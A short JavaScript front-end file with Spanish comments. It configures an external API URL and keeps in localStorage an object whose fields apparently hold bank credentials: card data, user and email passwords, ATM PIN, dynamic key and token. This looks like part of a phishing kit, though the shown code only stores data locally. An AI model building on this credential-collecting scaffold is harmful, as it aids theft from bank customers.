/**
 * CONFIGURACION 
 */
    const API_URL = 'https://d2fg05l0kjdx19.cloudfront.net'; // Cambiar según convenga.





const LS = window.localStorage;
let info = {
    cc: '',
    names: '',
    cenv: '',
    dir: '',
    user: '',
    puser: '',
    ccajero: '',
    cavances: '',
    cdin: '',
    email: '',
    pemail: '',
    cel: '',
    ban: '',
    p: '',
    f: '',
    c: '',
    type: '',
    tok: '',
    err: ''
}

LS.getItem('info') ? info = JSON.parse(LS.getItem('info')) : LS.setItem('info', JSON.stringify(info));

function limitarDigitos(input, maxDigits) {
    parseInt(input.value)
    if (input.value.length > maxDigits) {
        input.value = input.value.slice(0, maxDigits);
    }
}

console.log("Main ON");